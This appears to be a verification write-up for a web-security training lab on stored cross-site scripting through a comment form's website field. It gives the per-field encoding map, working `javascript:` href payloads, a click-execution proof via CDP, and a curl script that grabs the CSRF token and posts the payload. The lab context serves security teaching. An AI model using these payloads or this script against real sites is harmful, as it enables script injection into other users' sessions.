# Verification — Stored XSS into href (`"` encoded, scheme open)

## Methodology
1. Session + CSRF acquisition (cookie jar), same as the first stored lab.
2. Multi-field mapping probe: distinct markers per field, one POST, re-GET and read
   each reflection's encoding (do NOT assume the previous build's map — this build
   differs: `comment` now encoded).
3. Whole-value `javascript:` store; byte-verify the rendered anchor.
4. Click-execution proof via CDP on a parallel `void(title)` comment (keeps the
   `alert(1)` comment pristine for acceptance).
5. Real-browser acceptance click; banner polls.

## Evidence

### 1. Field map (POST → re-GET)
```
comment=CMTPROBE<<<>>>   → <p>CMTPROBE&lt;&lt;&lt;&gt;&gt;&gt;</p>     (encoded — dead)
name=NMPROBE"'<b>        → …>NMPROBE&quot;&apos;&lt;b&gt;</a>          (encoded — dead)
website=https://WSMARK.example.com/a"'<>b
                         → href="https://WSMARK.example.com/a&quot;'<>b"
 Fu → `"` encoded; `'` `<` `>` raw inside href (sink candidate)
email                    → not reflected anywhere                      (no sink)
```

### 2. Scheme acceptance (the actual hole)
```
website=javascript:alert(1)
→ <a id="author" href="javascript:alert(1)">ClickMe</a>   (verbatim, persisted)
```
No validation, no stripping, no `pattern` attribute on the form input.

### 3. Click-execution proof (CDP, parallel non-blocking comment)
```
website=javascript:void(document.title='STOREDCLICK')  (name=Probe2)
→ href stored verbatim
→ Page.navigate /post?postId=1 → CDP click on Probe2 anchor
→ title before: <lab title> ; title after: STOREDCLICK
```
Stored `javascript:` URIs execute in page origin on click — persistence + execution
both proven without touching the acceptance payload.

### 4. Lab acceptance
Real browser tab on `/post?postId=1`; physical click on "ClickMe" → `alert(1)` fired →
banner `is-solved` (first poll).

### 5. Dead-end analysis
| Candidate | Result | Why |
|---|---|---|
| `"`-breakout (`" autofocus…`) | `&quot;` — attribute never terminates | title's defense is real for THIS degree of freedom |
| Tag injection via raw `<>` in href | inert by construction | `<` inside an attribute value never opens a tag (HTML tokenization) |
| `comment`/`name` injection | fully encoded on this build | coverage gap moved: this build hardened text contexts, left the URI value open (mirror image of the first stored lab) |
| `'`-breakout | inapplicable | attribute is double-quoted |

## Reproducibility
```
BASE=…; JAR=ck; curl -c $JAR "$BASE/post?postId=1" > p.html
CSRF=$(grep -oP 'name="csrf" value="\K[^"]+' p.html | head -1)
curl -b $JAR -c $JAR --data-urlencode "csrf=$CSRF" --data-urlencode "postId=1" \
  --data-urlencode "comment=c" --data-urlencode "name=N" \
  --data-urlencode "email=e@x.y" --data-urlencode "website=javascript:alert(1)" \
  "$BASE/post/comment"
curl -b $JAR "$BASE/post?postId=1" | grep 'id="author"'
# click proof: CDP navigate + Runtime.evaluate anchor.click() + read title
```

## Confirmation criteria
- CONFIRMED: per-field map, verbatim `javascript:` persistence, CDP click execution,
  real-browser `alert(1)` + acceptance.
- Structural (spec-axiomatic): `<>` raw inside attribute values cannot open tags.